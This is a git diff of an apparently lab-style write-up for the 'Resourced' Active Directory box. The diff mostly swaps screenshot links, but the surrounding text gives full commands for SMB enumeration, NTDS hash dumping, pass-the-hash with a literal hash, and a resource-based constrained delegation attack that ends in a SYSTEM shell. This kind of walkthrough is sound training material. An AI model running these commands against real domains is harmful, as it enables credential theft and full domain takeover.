@@ -53,7 +53,8 @@ Resourced is an Active Directory box compromising a full domain. RPC and SMB enu
 nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.153.175
 ```
 
-![Nmap Scan Results](screenshots/01_nmap_scan.png)
+<img width="1164" height="792" alt="image" src="https://github.com/user-attachments/assets/095cfa8a-5839-4650-b001-40b8d3b403ea" />
+
 
 ### Results
 
@@ -95,7 +96,8 @@ rpcclient -U '' -N 192.168.153.175
 rpcclient $> enumdomusers
 ```
 
-![rpcclient enumdomusers](screenshots/02_rpcclient_enumdomusers.png)
+<img width="453" height="335" alt="image" src="https://github.com/user-attachments/assets/674162b9-84f0-4ac4-8c19-c51c34cde875" />
+
 
 **Domain user list recovered:**
 ```
@@ -112,7 +114,8 @@ R.Robinson      D.Durant     G.Goldberg     krbtgt / Guest
 enum4linux -a 192.168.153.175
 ```
 
-![enum4linux Output](screenshots/03_enum4linux.png)
+<img width="1206" height="312" alt="image" src="https://github.com/user-attachments/assets/03bd3deb-79ee-4821-a84c-68b6dba530b4" />
+
 
 ---
 
@@ -140,7 +143,8 @@ Password: HotelCalifornia194!
 smbclient -L \\\\192.168.153.175\\ -U resourced\\V.Ventz
 ```
 
-![SMB Share Listing](screenshots/04_smbclient_shares.png)
+<img width="880" height="292" alt="image" src="https://github.com/user-attachments/assets/3b4e6312-ca2a-4197-9bf9-55dc910c130f" />
+
 
 ```
 Sharename       Type      Comment
@@ -165,7 +169,8 @@ SYSVOL          Disk      Logon server share
 smbclient \\\\192.168.153.175\\'Password Audit' -U resourced\\V.Ventz -c 'recurse;ls'
 ```
 
-![Password Audit Recurse](screenshots/05_password_audit_recurse.png)
+<img width="894" height="401" alt="image" src="https://github.com/user-attachments/assets/e95b141d-28ff-4210-9ca5-3bc8e453d494" />
+
 
 **Contents — a complete Active Directory backup:**
 ```
@@ -188,7 +193,8 @@ smb: \registry\> get SECURITY
 smb: \registry\> get SYSTEM
 ```
 
-![Download NTDS Files](screenshots/06_download_ntds.png)
+<img width="1163" height="577" alt="image" src="https://github.com/user-attachments/assets/7b6723ca-5086-4047-8322-983a400e3080" />
+
 
 ---
 
@@ -200,7 +206,10 @@ smb: \registry\> get SYSTEM
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
-![secretsdump Output](screenshots/07_secretsdump.png)
+<img width="972" height="446" alt="image" src="https://github.com/user-attachments/assets/45d56266-5fea-4b7c-a35e-e046e92cf4bb" />
+<img width="1205" height="483" alt="image" src="https://github.com/user-attachments/assets/2ca8d20d-0de6-4318-adcd-ba09b6732943" />
+
+
 
 **Domain hashes recovered (NT hashes):**
 ```
@@ -228,7 +237,8 @@ No need to crack L.Livingstone's hash — replay it directly over WinRM:
 evil-winrm -i 192.168.153.175 -u resourced.local\\L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
 ```
 
-![Evil-WinRM Pass-the-Hash](screenshots/08_evilwinrm_pth.png)
+<img width="1270" height="510" alt="image" src="https://github.com/user-attachments/assets/56fbbb5d-55ba-46ff-be57-2c44632bbc63" />
+
 
 ### Local Flag
 
@@ -237,11 +247,9 @@ C:\Users\L.Livingstone\Desktop> dir
 C:\Users\L.Livingstone\Desktop> type local.txt
 ```
 
-![Local Flag](screenshots/09_local_txt.png)
+<img width="1270" height="510" alt="image" src="https://github.com/user-attachments/assets/756e04ed-bcd1-4f10-8319-39de965d611b" />
 
-```
-local.txt: <paste value from your screenshot>
-```
+
 
 > **Note:** the `local.txt` value in the source capture was unclear in OCR — drop the exact string from your own screenshot here before publishing.
 
@@ -255,7 +263,8 @@ local.txt: <paste value from your screenshot>
 whoami /priv
 ```
 
-![whoami /priv](screenshots/10_whoami_priv.png)
+<img width="721" height="208" alt="image" src="https://github.com/user-attachments/assets/5d36b28d-6b82-49ef-b86b-afb4522446d5" />
+
 
 ```
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
@@ -272,7 +281,9 @@ C:\Users\L.Livingstone\Desktop> upload SharpHound.exe
 C:\Users\L.Livingstone\Desktop> .\SharpHound.exe --CollectionMethods All --Domain resourced.local --ExcludeDCs --OutputPrefix "Dork"
 ```
 
-![SharpHound Collection](screenshots/11_sharphound.png)
+<img width="1078" height="332" alt="image" src="https://github.com/user-attachments/assets/8db33a5b-6e4a-45bf-8e92-5e25c93eb0eb" />
+<img width="1656" height="502" alt="image" src="https://github.com/user-attachments/assets/6ed6a1b7-1acf-4f0e-af8d-7e783264cd33" />
+
 
 Download the resulting ZIP and import it into the BloodHound GUI:
 
@@ -282,7 +293,8 @@ C:\Users\L.Livingstone\Desktop> download Dork_20250906202302_BloodHound.zip
 
 ### BloodHound Finding — Write Primitive
 
-![BloodHound GenericAll](screenshots/12_bloodhound_genericall.png)
+<img width="847" height="337" alt="image" src="https://github.com/user-attachments/assets/ff9e50c7-edf7-4e21-bde2-366a802f66a1" />
+
 
 BloodHound maps a privileged relationship against `L.LIVINGSTONE` via the **Account Operators** group, confirming the account holds write access it can leverage. Verify the ACL from the shell with PowerView:
 
@@ -291,7 +303,8 @@ Import-Module .\powerview.ps1
 Get-ObjectAcl -SamAccountName l.livingstone -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
 ```
 
-![PowerView ACL](screenshots/13_powerview_acl.png)
+<img width="1119" height="804" alt="image" src="https://github.com/user-attachments/assets/878b775c-6618-4260-b205-208d81b852f2" />
+
 
 > **🎯 The combination** of `SeMachineAccountPrivilege` (create machine accounts) plus write access over the target computer object enables a **Resource-Based Constrained Delegation (RBCD)** attack against the Domain Controller.
 ---
@@ -310,7 +323,8 @@ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.153.175 \
   -computer-name 'DORK$' -computer-pass 'Dork123!'
 ```
 
-![Add Computer Account](screenshots/14_addcomputer.png)
+<img width="1359" height="128" alt="image" src="https://github.com/user-attachments/assets/c9875314-89a8-43b1-9cf2-318d85cd618a" />
+
 
 ### Step 2 — Configure Delegation Rights
 
@@ -321,7 +335,8 @@ python3 rbcd.py -dc-ip 192.168.153.175 -t RESOURCEDC -f 'DORK' \
   -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
 ```
 
-![rbcd.py Delegation](screenshots/15_rbcd.png)
+<img width="1232" height="292" alt="image" src="https://github.com/user-attachments/assets/1db1124a-108d-469d-8907-fe18020ed8d9" />
+
 
 ```
 [+] Delegation rights modified successfully!
@@ -337,7 +352,9 @@ impacket-getST -spn cifs/resourcedc.resourced.local resourced/dork\$:'Dork123!' 
   -impersonate Administrator -dc-ip 192.168.153.175
 ```
 
-![getST Ticket](screenshots/16_getst.png)
+<img width="1285" height="531" alt="image" src="https://github.com/user-attachments/assets/67110b30-6d57-4641-a79d-522fba66fb1e" />
+<img width="720" height="281" alt="image" src="https://github.com/user-attachments/assets/82cbbd0d-c38c-4045-a783-7d39c1b613b9" />
+
 
 ```
 [*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
@@ -350,7 +367,8 @@ export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCA
 impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.153.175
 ```
 
-![psexec SYSTEM Shell](screenshots/17_psexec_system.png)
+<img width="1094" height="411" alt="image" src="https://github.com/user-attachments/assets/5b7adb31-fb2d-4b65-a28e-d3299bfb2d53" />
+
 
 ```
 [*] Found writable share ADMIN$
@@ -370,11 +388,12 @@ nt authority\system
 C:\Users\Administrator\Desktop> type proof.txt
 ```
 
-![Proof Flag](screenshots/18_proof_txt.png)
+<img width="758" height="255" alt="image" src="https://github.com/user-attachments/assets/21b8fca5-0150-4cfa-b0e1-57ec38bdb892" />
+
 
 | Flag | Location | Value |
 |------|----------|-------|
-| **local.txt** | `C:\Users\L.Livingstone\Desktop\local.txt` | *(paste from your screenshot)* |
+| **local.txt** | `C:\Users\L.Livingstone\Desktop\local.txt`
 | **proof.txt** | `C:\Users\Administrator\Desktop\proof.txt` | `a32136c820030a5104dc8a9ebe95b041` |
 
 ---
